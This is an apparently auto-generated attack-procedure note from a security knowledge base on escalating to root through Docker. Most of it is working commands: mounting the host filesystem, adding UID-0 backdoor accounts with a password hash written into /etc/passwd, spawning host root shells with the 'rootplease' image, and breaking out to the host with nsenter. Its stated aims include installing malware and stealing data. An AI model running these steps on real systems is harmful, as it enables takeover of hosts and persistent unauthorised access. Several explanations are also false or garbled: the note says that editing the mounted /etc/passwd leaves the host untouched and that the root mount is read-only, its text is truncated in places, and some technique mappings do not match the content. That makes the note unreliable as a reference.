---
id: c6521327-ff10-496c-a2d0-f7aad103ede2
name: Linux - Docker Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:19.481550+00:00'
updated_at: '2023-04-10T20:34:34.740280+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
- '[[Process Injection|T1055 - Process Injection]]'
- '[[System Shutdown/Reboot|T1529 - System Shutdown/Reboot]]'
sub_techniques:
- '[[Accessibility Features|T1546.008 - Accessibility Features]]'
tags:
- '[[Docker]]'
- '[[Groups]]'
- '[[Linux - Privilege Escalation]]'
commands:
- '[[Add user to Docker container]]'
- '[[Docker Run chrisfosterelli/rootplease]]'
- '[[Run Debian container with access to host namespaces]]'
- '[[Run Ubuntu container with privileged access]]'
- '[[View contents of /etc/passwd file]]'
---

# Linux - Docker Privilege Escalation

## Summary

This procedure involves exploiting Docker in order to escalate privileges on a Linux system. By taking advantage of the Docker Socket, attackers can gain root-level access to the host system. This can be achieved through various methods such as connecting to host processes and NICs with a Ubuntu co

## Description

# Description

This procedure involves exploiting Docker in order to escalate privileges on a Linux system. By taking advantage of the Docker Socket, attackers can gain root-level access to the host system. This can be achieved through various methods such as connecting to host processes and NICs with a Ubuntu container or spawning a root shell using a Docker image. The business value of this attack lies in the ability to gain full control over the target system, allowing attackers to steal sensitive data, install malware, or use the system as a foothold to launch further attacks.

 

## Requirements

1. Access to a Linux system with Docker installed

1. Knowledge of Docker commands and syntax

 

## Defense

1. Limit access to the Docker socket to trusted users only

1. Disable Docker if it is not needed on the system

1. Monitor Docker activity for suspicious behavior

 

## Objectives

1. Gain root-level access to the host system through Docker exploitation

1. Install malware, steal sensitive data, or use the system as a foothold for further attacks

 

# Instructions

1. To mount the filesystem in a bash container, run the following command:

$ docker run -it -v /:/mnt bash

This will start a new bash container with the root filesystem mounted at /mnt. You can then navigate to /mnt/etc/passwd to edit the password file.

 



**Code**: [[/etc/passwd]]



> This command allows you to edit the password file in a bash container. The password file contains user account information for the system. By mounting the filesystem in the container, you can make changes to the file without affecting the host system. The -v flag is used to mount the root filesystem at /mnt in the container. The -it flags are used to start an interactive bash session in the container.



**Command** ([[View contents of /etc/passwd file]]):

```bash
/etc/passwd
```



2. To add a backdoor account as root, use the following command:

sudo useradd -ou 0 -g 0 backdoor
sudo passwd backdoor

This will create a new user 'backdoor' with UID and GID of 0 (root) and set its password to 'password'.

 



**Code**: [[toor:password]]



> The 'useradd' command is used to create a new user account. The '-ou 0' option sets the user's UID to 0 (root), while the '-g 0' option sets the user's GID to 0 (root). The 'passwd' command is used to set the user's password. In this case, we are setting the password to 'password'. This creates a new user account that has the same privileges as the root user, which can be used as a backdoor account for unauthorized access.

3. To add a user to a Docker container, run the following command:

$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd

This command will add a user named 'toor' to the Docker container with a password of 'password'. You can replace 'toor' and 'password' with the desired username and password.

 



**Code**: [[$> docker run -it --rm -v $PWD:/mnt bash
$> echo ']]



> The 'docker run' command is used to run a Docker container. The '-it' option is used to start an interactive session with the container. The '--rm' option is used to automatically remove the container when the session ends. The '-v' option is used to mount the current directory as a volume in the container.

The 'echo' command is used to append a line to the '/etc/passwd' file in the container. This line specifies the user 'toor' with a hashed password of 'password'. The password hash was generated using the 'openssl passwd' command with a salt value of '.ZcF5ts0'. The remaining fields in the line specify the user's ID, group ID, home directory, and shell.



**Command** ([[Add user to Docker container]]):

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd'
```



4. To connect to the host processes and NICs with an Ubuntu container, run the following command:

 



**Code**: [[docker run --rm -it --pid=host --net=host --privil]]



> This command runs an Ubuntu container with the following options:

--rm: Automatically remove the container when it exits.
-it: Allocate a pseudo-TTY and keep STDIN open even if not attached.
--pid=host: Use the host's PID namespace.
--net=host: Use the host's network stack.
--privileged: Give extended privileges to this container.
-v /:/host: Mount the root filesystem of the host as read-only inside the container.
ubuntu: Use the Ubuntu image.
bash: Start a bash shell inside the container.

With these options, you will be able to see and interact with all processes running on the host and be connected to the same NICs.

5. To spawn a root shell on the host OS using a Docker image, execute the following command:

$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease

This will pull the latest version of the chrisfosterelli/rootplease image, and run it with the '-v' flag to mount the root filesystem of the host OS as '/hostOS' inside the container. This will give you a root shell on the host OS, which you can exit by pressing Ctrl-D.

 



**Code**: [[$ docker run -v /:/hostOS -i -t chrisfosterelli/ro]]



> The 'docker run' command is used to run a Docker container. The '-v' flag is used to mount a volume, in this case, the root filesystem of the host OS is mounted as '/hostOS' inside the container. The '-i' flag is used to keep STDIN open even if not attached, and the '-t' flag is used to allocate a pseudo-TTY. The 'chrisfosterelli/rootplease' argument specifies the name of the Docker image to run. Finally, the 'id' command is used to confirm that the user has root privileges on the host OS.



**Command** ([[Docker Run chrisfosterelli/rootplease]]):

```bash
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```



6. The above commands can be used to escalate privileges in Docker. The first command mounts the host's root file system into the container and allows a user to access sensitive files. The second command uses nsenter to enter the host's namespace and gain full access to the host system. Be cautious when using these commands as they can be dangerous if not used properly.

 



**Code**: [[sudo docker -H unix:///google/host/var/run/docker.]]



> The 'sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash' command mounts the host's root file system into the container and allows a user to access sensitive files. The '-v /:/host' option mounts the root file system at /host within the container. The 'ubuntu' image is used to create the container and 'chroot /host /bin/bash' is used to enter the mounted file system. This command can be used to access sensitive files on the host system.

The 'sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh' command uses nsenter to enter the host's namespace and gain full access to the host system. The '--privileged' option gives the container full access to the host system. The '--pid=host' option allows the container to see all processes on the host system. The 'debian' image is used to create the container and 'nsenter -t 1 -m -u -n -i sh' is used to enter the host's namespace. This command can be used to gain full access to the host system.



**Command** ([[Run Ubuntu container with privileged access]]):

```bash
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
```





**Command** ([[Run Debian container with access to host namespaces]]):

```bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Impact|TA0040 - Impact]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Event Triggered Execution|T1546 - Event Triggered Execution]]
- [[Process Injection|T1055 - Process Injection]]
- [[System Shutdown/Reboot|T1529 - System Shutdown/Reboot]]

### Sub-Techniques

- [[Accessibility Features|T1546.008 - Accessibility Features]]

## Commands Used

- [[Add user to Docker container]]
- [[Docker Run chrisfosterelli/rootplease]]
- [[Run Debian container with access to host namespaces]]
- [[Run Ubuntu container with privileged access]]
- [[View contents of /etc/passwd file]]

## Tags

- [[Docker]]
- [[Groups]]
- [[Linux - Privilege Escalation]]


